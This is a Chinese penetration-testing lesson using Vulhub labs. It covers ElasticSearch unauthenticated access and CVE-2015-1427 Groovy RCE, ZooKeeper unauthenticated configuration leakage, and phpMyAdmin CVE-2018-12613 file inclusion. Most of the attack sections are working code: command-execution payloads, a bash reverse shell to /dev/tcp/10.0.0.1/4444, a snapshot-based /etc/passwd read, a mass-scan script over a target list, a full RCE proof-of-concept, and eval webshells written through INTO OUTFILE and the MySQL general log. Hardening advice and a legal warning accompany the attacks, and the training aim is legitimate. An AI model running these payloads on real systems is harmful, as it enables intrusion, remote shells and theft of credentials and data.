# Vulhub 高频漏洞实战 · B 级（未授权 / 中间件）
## 总览
| # | 漏洞 | CVE / 类型 | 危害 |
| --- | --- | --- | --- |
| 1 | ElasticSearch 未授权 + CVE-2015-1427 Groovy RCE | 未授权 + 沙箱绕过 | 数据泄露 / RCE |
| 2 | ZooKeeper 未授权 + 配置泄露 | 未授权 | 配置泄露 / 服务接管 |
| 3 | phpMyAdmin 后台 RCE / CVE-2018-12613 | 文件包含 + 日志写 shell | RCE |


未授权访问是"中间件安全"的重灾区，与之前学过的 **Redis 未授权** 同属一类。运维人员把中间件直接暴露公网且不开认证，造成的危害往往超过单个 Web 漏洞。

---

# 第 1 关 ElasticSearch 未授权 + CVE-2015-1427 Groovy RCE
## 1.1 产品介绍
**ElasticSearch** 是基于 Lucene 的分布式全文搜索/数据分析引擎，使用极广：

+ 日志分析（ELK / EFK 栈的核心）
+ 全文搜索（电商商品、文档检索）
+ 监控指标存储
+ 默认端口 9200（HTTP REST API）、9300（节点通信）

ElasticSearch 提供 RESTful API，简单易用，但也因此常被误配置为对公网开放。

## 1.2 漏洞背景
ElasticSearch 历史安全问题分两类：

### 1.2.1 未授权访问（默认无认证）
ElasticSearch 7.x 之前**默认无任何认证**，端口 9200 对外开放即等于完全公开：

+ 任意人可读取所有 index / document
+ 可创建 / 删除数据
+ 可查看节点信息（操作系统版本、Java 版本、插件列表）

### 1.2.2 CVE-2015-1427 Groovy 沙箱绕过
ElasticSearch 1.4.0 - 1.4.2 支持用 Groovy 脚本做查询计算（默认沙箱）。

+ 沙箱代码：

```java
// 只允许部分 Java 类
if (clazz.getName().startsWith("java.lang.Math")) allow();
```

+ 绕过：用反射调用 `java.lang.Runtime`
+ payload：

```json
{"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"exec\", ...)"}
```

利用 Groovy 注入做 RCE，配合未授权就是 **匿名 RCE**。

### 1.2.3 后续 CVE
+ CVE-2015-3337（目录穿越读文件）
+ CVE-2015-5531（文件读取）
+ CVE-2014-3120（MVEL 注入）

## 1.3 利用条件与版本
| 漏洞 | 版本 |
| --- | --- |
| 未授权（默认配置） | 所有版本（除非显式开启 X-Pack / Search Guard） |
| CVE-2015-1427 | 1.4.0 - 1.4.2 |
| CVE-2015-5531 | 1.5.0 - 1.6.0 |
| CVE-2014-3120 | 1.1.1 以下 |


**利用条件**：

+ 9200 端口对公网开放
+ 无认证
+ Groovy / MVEL 脚本引擎启用（动态脚本）

## 1.4 复现过程
### 1.4.1 启动环境
```bash
cd vulhub/elasticsearch/CVE-2015-1427
docker-compose up -d
# 端口 9200
```

### 1.4.2 未授权指纹识别
```bash
curl http://target:9200/
```

返回：

```json
{
  "name" : "Surge",
  "cluster_name" : "elasticsearch",
  "version" : {
    "number" : "1.4.2",
    "build_hash" : "9bcaffa",
    ...
  },
  "tagline" : "You Know, for Search"
}
```

发现 ES 版本和集群信息 → 未授权。

### 1.4.3 枚举所有 index
```bash
curl http://target:9200/_cat/indices?v
```

返回所有 index 列表：

```plain
health status index    uuid                   pri rep docs.count ...
yellow open   bank     H0gJOXPxSwW3atXkAR0E4A   5   1  1000  ...
yellow open   secret   abc123...                5   1     1  ...
```

### 1.4.4 读取数据
```bash
# 列出 secret index 的所有 document
curl http://target:9200/secret/_search?pretty

# 读取特定 document
curl http://target:9200/secret/credential/1?pretty
```

### 1.4.5 CVE-2015-1427 RCE（Groovy 沙箱绕过）
**前置：先创建一个 index 并写入一条数据**：

```bash
curl -X POST http://target:9200/website/blog/ -d '{"name":"test"}'
```

**触发 Groovy 注入**：

```bash
curl -X POST http://target:9200/website/blog/1/_search?pretty -d '
{
  "size": 1,
  "query": {
    "filtered": {
      "query": { "match_all": {} }
    }
  },
  "script_fields": {
    "exp": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"
    }
  }
}'
```

或更精简的 payload：

```bash
curl -XPOST 'http://target:9200/_search?pretty' -H 'Content-Type: application/json' -d '
{
  "script_fields": {
    "ls": {
      "script": "import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"
    }
  }
}'
```

返回中包含 `uid=...`。

### 1.4.6 反弹 Shell
把 `id` 换成 base64 编码的反弹 shell：

```bash
import java.io.*;
new Scanner(Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"}).getInputStream()).useDelimiter(\"\\\\A\").next()
```

### 1.4.7 CVE-2015-5531 文件读取（另一个变体）
```bash
# 1. 创建一个特殊 index
curl -XPOST 'http://target:9200/ledbt' -d '{
  "settings": {"index": {"number_of_shards": 1, "number_of_replicas": 0}},
  "mappings": {"names": {"properties": {"name": {"type": "string"}}}}
}'

# 2. 创建 snapshot repo 指向 /
curl -XPUT 'http://target:9200/_snapshot/ledbt' -d '{
  "type": "fs",
  "settings": {"location": "/"}
}'

# 3. 触发 snapshot
curl -XPUT 'http://target:9200/_snapshot/ledbt/back1?wait_for_completion=true'

# 4. 读取任意文件
curl http://target:9200/_snapshot/ledbt/back1/../../../../etc/passwd
```

## 1.5 修复建议
1. **升级 ElasticSearch 到最新版**
2. **启用 X-Pack 安全模块**（7.x 之后免费）：

```yaml
xpack.security.enabled: true
xpack.security.authc:
  anonymous.username: anonymous
  anonymous.roles: read_only
```

3. **网络隔离**：9200 端口仅内网访问
4. **反向代理 + 认证**：用 Nginx + BasicAuth 套一层
5. **关闭脚本引擎**（如不需要）：

```yaml
script.disable_dynamic: true   # 旧版
script.allowed_types: inline   # 新版
```

6. 关闭删除 index 接口（运维层限制）
7. 监控异常查询（用 Audit Log）

---

# 第 2 关 ZooKeeper 未授权 + 配置泄露
## 2.1 产品介绍
**Apache ZooKeeper** 是分布式协调服务，用于：

+ 配置管理（注册中心）
+ 命名服务
+ 分布式锁
+ 集群管理

是 Hadoop、Kafka、Dubbo、HBase 等大量分布式系统的"核心注册中心"。

+ 默认端口 2181（客户端）、2888（节点通信）、3888（选举）

## 2.2 漏洞背景
ZooKeeper 历史版本**默认无 ACL（访问控制）**，任何能连上 2181 端口的人都能：

+ 列出所有 znode
+ 读取配置（数据库密码、API key、内网服务地址）
+ 创建/删除 znode（接管服务注册）

业内著名的"4 字命令"漏洞：

+ ZooKeeper 提供 `stat` / `envi` / `dump` / `conf` 等四字母命令
+ 通过简单 TCP 发送四个字母即可获取敏感信息

```plain
echo stat | nc target 2181
```

```plain
Zookeeper version: 3.4.13-...
Clients:
 /10.0.0.5:51234...
Latency min/avg/max: 0/5/100
Received: 12345
Sent: 12000
Connections: 5
Outstanding: 0
Zxid: 0x100000015
Mode: standalone
Node count: 234
```

直接泄露节点数量、客户端连接、版本等关键信息。

## 2.3 利用条件
| 漏洞 | 版本 |
| --- | --- |
| 默认无认证 | 所有版本（不配置 ACL 时） |
| 四字命令未限制 | 默认配置 |


**利用条件**：

+ 2181 端口可达
+ 管理员未配置 ACL（默认）

## 2.4 复现过程
### 2.4.1 启动环境
```bash
cd vulhub/zookeeper/zookeeper-unauth
# 或手工启动
docker run -d --name zk -p 2181:2181 zookeeper:3.4.13
```

### 2.4.2 四字命令探测
```bash
# stat 命令
echo stat | nc target 2181

# envi 命令（环境变量）
echo envi | nc target 2181

# conf 命令（配置）
echo conf | nc target 2181

# dump 命令
echo dump | nc target 2181

# cons 命令
echo cons | nc target 2181

# ruok 命令（Are you OK?）
echo ruok | nc target 2181
```

返回大量敏感信息。

### 2.4.3 用 zkCli 列出所有 znode
```bash
docker run -it --rm zookeeper:3.4.13 zkCli.sh -server target:2181
```

进入交互式命令行：

```plain
[zk: target:2181(CONNECTED) 0] ls /
[zookeeper, dubbo, services, config]

[zk: target:2181(CONNECTED) 1] ls /config
[db, redis, mysql, kafka]

[zk: target:2181(CONNECTED) 2] get /config/db
{"host":"10.0.0.1","port":3306,"user":"root","password":"P@ssw0rd"}
```

数据库密码直接拿到。

### 2.4.4 Dubbo 服务接管
如果 ZooKeeper 是 Dubbo 注册中心，攻击者可以：

+ 注册一个伪造的 Dubbo 服务（同名高优先级）
+ 让正常消费者调用到攻击者的恶意服务
+ 实现中间人攻击或参数窃取

### 2.4.5 自动化扫描
```bash
# Nmap
nmap -p 2181 --script zookeeper-info target

# Nuclei 模板
nuclei -t zookeeper-unauth.yaml -u target:2181
```

## 2.4.6 批量探测脚本
```python
import socket

def check(host, port=2181, timeout=3):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.send(b'envi')
        data = s.recv(8192).decode(errors='ignore')
        if 'zookeeper.version' in data:
            return data
    except Exception:
        return None
    finally:
        s.close()

for host in open('targets.txt'):
    r = check(host.strip())
    if r:
        print(f'[+] {host}: {r[:200]}')
```

## 2.5 修复建议
1. **启用 ACL**：

```bash
# 在 zkCli 中
[zk: localhost:2181] addauth digest admin:StrongPass
[zk: localhost:2181] setAcl / auth:admin:StrongPass:cdwra
```

2. **限制四字命令**（3.5.x 之后）：

```properties
# zoo.cfg
4lw.commands.whitelist=stat,ruok
```

3. **网络隔离**：2181 仅内网访问，不对公网暴露
4. **升级到 3.5.x+**，默认有更严格的访问控制
5. 监控异常 znode 操作
6. 生产环境用 Kerberos 鉴权（SASL）

---

# 第 3 关 phpMyAdmin 后台 RCE / CVE-2018-12613
## 3.1 产品介绍
**phpMyAdmin** 是 MySQL/MariaDB 的 Web 管理界面，使用极广：

+ 用 PHP 写，开源免费
+ 提供图形化界面管理数据库
+ 几乎所有 LAMP/LNMP 一键包都自带
+ 默认端口 80 / 8080

是渗透测试中"找到 MySQL 后拿 shell"的常用跳板。

## 3.2 漏洞背景
phpMyAdmin 历史 RCE 漏洞众多，本课件选三个典型：

### 3.2.1 CVE-2018-12613（文件包含 → RCE）
phpMyAdmin 4.8.0 / 4.8.1 版本：

+ `phpmyadmin/index.php` 的 `target` 参数接收页面名
+ 检查代码：

```php
if (! empty($_REQUEST['target']) && is_string($_REQUEST['target'])) {
    if (Core::checkPageValidity($_REQUEST['target'])) {
        include $_REQUEST['target'];
        exit;
    }
}
```

+ `Core::checkPageValidity` 白名单检查不严，可通过二次 URL 编码绕过
+ 攻击者：访问 `?target=db_sql.php%253f/../../../../../../../../etc/passwd` → 包含任意文件

经典利用：先包含 `/ SESSION` 文件，把 PHP 代码塞进 Session，再包含执行。

### 3.2.2 后台写文件 RCE（通用姿势）
只要拿到 phpMyAdmin 后台：

+ 执行 `SELECT '<?php @eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/shell.php'`
+ 前提：MySQL 有 `FILE` 权限 + `secure_file_priv` 允许写到 web 目录

### 3.2.3 CVE-2016-5734（旧版 RCE）
phpMyAdmin 4.0.10.16 之前 4.x / 4.4.15.7 之前 4.4 / 4.6.3 之前 4.6：

+ 用 preg_replace /e 修饰符导致 RCE

## 3.3 利用条件与版本
| CVE / 类型 | 版本 | 条件 |
| --- | --- | --- |
| CVE-2018-12613 | 4.8.0 / 4.8.1 | 无需认证 |
| CVE-2016-5734 | 4.0-4.6 系列 | 需后台账户 |
| 通用写文件 RCE | 任意 | 后台 + MySQL FILE 权限 + secure_file_priv 合适 |


## 3.4 复现过程
### 3.4.1 启动环境
```bash
cd vulhub/phpmyadmin/CVE-2018-12613
docker-compose up -d
# 账户 root / root
```

### 3.4.2 CVE-2018-12613 文件包含
**步骤 1：检测漏洞**

```bash
curl "http://target/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
```

如果返回页面中能看到 `/etc/passwd` 内容，说明包含成功。

**步骤 2：构造 Session 文件**

phpMyAdmin 把 Session 存储在 `/tmp/sess_<PHPSESSID>`。Session 里会包含 `User-Agent`、`_SESSION` 变量等。

我们可以"创建"一个 Session 文件：

```bash
# 在 phpMyAdmin 中执行 SQL（或通过 GET）
SELECT '<?php phpinfo();?>';
```

phpMyAdmin 会把最近执行的 SQL 存入 Session 文件。

**步骤 3：包含 Session 文件**

```bash
curl -b "phpMyAdmin=YOUR_PHPSESSID" \
  "http://target/index.php?target=db_sql.php%253f/../../../../tmp/sess_YOUR_PHPSESSID"
```

包含 Session 文件，其中的 PHP 代码被执行。

### 3.4.3 完整 PoC 脚本
```python
import requests

TARGET = 'http://target/'
SESS = requests.Session()

# 1. 触发 session 写入恶意 SQL
SESS.get(TARGET + 'index.php')
sql = "SELECT '<?php system($_GET[c]);?>'"
SESS.get(TARGET + 'sql.php', params={
    'db': 'mysql',
    'sql_query': sql,
    'token': 'fake'   # 漏洞版本可绕过 token
})

# 2. 拿到 PHPSESSID
phpsessid = SESS.cookies.get('phpMyAdmin')

# 3. 包含 session 文件
r = SESS.get(TARGET + 'index.php', params={
    'target': 'db_sql.php%253f/../../../../tmp/sess_' + phpsessid,
    'c': 'id'
})
print(r.text)
```

### 3.4.4 通用后台写文件 RCE
**前提**：账户 `root` / `root` 登录成功。

**步骤 1：检查 secure_file_priv**

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

返回：

+ `NULL` → 不能写文件（无法用此方法）
+ 空 → 可以写任意路径
+ `/var/lib/mysql-files/` → 只能写该目录

**步骤 2：写 webshell**

```sql
SELECT '<?php @eval($_POST["c"]);?>' 
INTO OUTFILE '/var/www/html/shell.php';
```

**步骤 3：访问 webshell**

```bash
curl -X POST http://target/shell.php -d 'c=phpinfo();'
```

### 3.4.5 通用日志 RCE（绕过 secure_file_priv）
如果 `secure_file_priv=NULL`，可用 MySQL general log：

```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php @eval($_POST["c"]);?>';
SET GLOBAL general_log = 'OFF';
```

每次执行 SQL 都会写入 log 文件，于是 log 文件包含 PHP 代码，访问即 webshell。

### 3.4.6 CVE-2016-5734（旧版）
```bash
git clone https://github.com/PalindromeLabs/PHP-8.1.0-dev-backdoor-rce
# 或针对 phpMyAdmin 4.x 的 PoC
python cve-2016-5734.py -u root -p root http://target/
```

## 3.5 修复建议
1. **升级 phpMyAdmin 到最新版**
2. **配置强认证**：
    - 修改默认 root 密码
    - 启用 cookie 模式 + blowfish_secret
    - 限制 root 仅本地登录
3. **MySQL 配置加固**：

```properties
[mysqld]
secure_file_priv=NULL            # 完全禁用文件读写
# 或
secure_file_priv=/tmp/uploads    # 限制可写目录（不在 web 根）
```

4. **关闭 general log / slow log**（生产环境）
5. **网络隔离**：phpMyAdmin 仅内网访问，或加 HTTP Basic Auth
6. **Nginx 配置**：禁止访问 `.sql` / `.inc` 等敏感文件
7. **Web 目录权限**：MySQL 用户不可写 Web 根目录（用户隔离）
8. WAF 规则：拦截 `INTO OUTFILE` / `INTO DUMPFILE` / `general_log_file`

---

## 总结表
| 漏洞 | 出现频率 | 利用难度 | 危害 | 关键指纹 |
| --- | --- | --- | --- | --- |
| ElasticSearch 未授权 | ★★★★ | 极易 | 数据泄露 / RCE | 端口 9200、`cluster_name` |
| ZooKeeper 未授权 | ★★★★ | 极易 | 配置泄露 / 服务接管 | 端口 2181、`stat` 回显 |
| phpMyAdmin | ★★★★★ | 中 | RCE | URL `/phpmyadmin/` |


## 中间件未授权横向对比
| 中间件 | 默认端口 | 默认认证 | 未授权危害 |
| --- | --- | --- | --- |
| Redis | 6379 | 无 | RCE（4 种姿势） |
| MongoDB | 27017 | 无 | 数据泄露 |
| ElasticSearch | 9200 | 无 | 数据泄露 + RCE |
| ZooKeeper | 2181 | 无 | 配置泄露 + 服务接管 |
| Memcached | 11211 | 无 | 数据篡改 |
| Docker API | 2375 | 无 | 容器逃逸 → 主机 RCE |
| Kubernetes API | 6443 | 有（默认） | 集群接管 |
| Hadoop YARN | 8088 | 无 | 任意任务 → RCE |
| CouchDB | 5984 | 无（旧版） | 数据泄露 + RCE |


**结论**：内网渗透中，**中间件未授权是仅次于弱口令的高频突破口**。所有这些中间件都应该在 pentest 时优先探测。

## 课后作业
1. **复现 3 个漏洞**，每个提交 PoC、复现截图、修复方案。
2. **未授权系列扩展**：用 Vulhub 启动 MongoDB / Memcached / Docker / Hadoop YARN 未授权环境，参照本课件方法复现。
3. **写一份《中间件安全 checklist》**，包含上面 9 类中间件的：
    - 默认端口
    - 默认认证机制
    - 未授权检测命令
    - 加固配置
4. **CVE 挖掘思路**：阅读 ElasticSearch 和 ZooKeeper 的官方安全公告，理解漏洞披露流程。
5. **自动化扫描**：用 Nuclei / xray / 风扫 编写上述中间件的指纹检测模板。
6. **内网渗透模拟**：搭建一个有 Redis + MySQL + ES + ZK 的内网，模拟从外网打点到内网横向的全流程。

## 法律与授权提醒
```plain
┌──────────────────────────────────────────────────────────┐
│ 1. 所有复现必须在本地 Vulhub 或授权环境                  │
│ 2. 中间件未授权在互联网上极常见，访问即可能违法          │
│ 3. 数据库内容（用户、订单、密码）属于"公民个人信息"      │
│    未授权读取可能构成                                    │
│    - 《刑法》253 条之一 侵犯公民个人信息罪               │
│    - 《刑法》285 条 非法侵入计算机信息系统罪             │
│    - 《个人信息保护法》                                  │
│ 4. 读取数据后绝对不可下载、传播、交易                    │
│ 5. 即使 SRC 范围内，发现未授权数据库应立即报告，不深挖   │
└──────────────────────────────────────────────────────────┘
```

---

## 完结总结（S + A + B 三章共 20 个漏洞）
| 类型 | 数量 | 价值 |
| --- | --- | --- |
| 框架 RCE | 4 | ThinkPHP / Struts2 / Drupal / Spring 系 |
| 反序列化 RCE | 5 | Shiro / Fastjson / WebLogic / Log4j2 / Jenkins |
| 表达式注入 | 3 | Spring Cloud / Solr / Confluence |
| 解析漏洞 | 3 | Apache 换行 / Nginx 解析 / Tomcat Ghostcat |
| 后门式 RCE | 1 | phpunit eval-stdin |
| 文件上传 + 后续 | 2 | GitLab ExifTool / phpMyAdmin |
| 未授权 | 2 | ElasticSearch / ZooKeeper |


学习路径回顾：

```plain
第 1 阶段（基础）：Top 10 漏洞类型（SQL 注入 / XSS / CSRF / SSRF / XXE / 文件上传 / 命令注入 / 反序列化 / 越权 / 逻辑漏洞 / SSTI）
                              ↓
第 2 阶段（实战）：Vulhub S 级（8 个 Java 高频）
                              ↓
第 3 阶段（实战）：Vulhub A 级（9 个 Web/框架）
                              ↓
第 4 阶段（实战）：Vulhub B 级（3 个未授权/中间件）
                              ↓
第 5 阶段（进阶）：内网渗透 / 提权 / 域渗透 / 红蓝对抗
```

完成上述全部课程，你已经具备：

+ **甲方 SRC 报告能力**（覆盖 Top 10 + 20 个高频 CVE）
+ **护网行动单兵作战能力**（外围打点、Java 中间件 RCE、未授权检测）
+ **CTF Web 题中等难度通关能力**

下一步建议进入**内网渗透阶段**：

+ **《Windows 域渗透》**（Kerberos / NTLM Relay / BloodHound / Mimikatz）
+ **《Linux 提权》**（SUID / sudo / 内核漏洞 / Cron）
+ **《权限维持与隐藏》**（Webshell 免杀 / 隧道 / C2 框架）

或继续 Web 安全专题深度：

+ **《API 安全》**（REST / GraphQL / JWT / OAuth）
+ **《Cloud Native 安全》**（Docker / K8s / Serverless 攻击）
+ **《客户端安全》**（小程序 / APP / Electron）

继续努力！渗透测试是持续学习的行业，每一个 CVE 都是知识点的延伸。⚔️
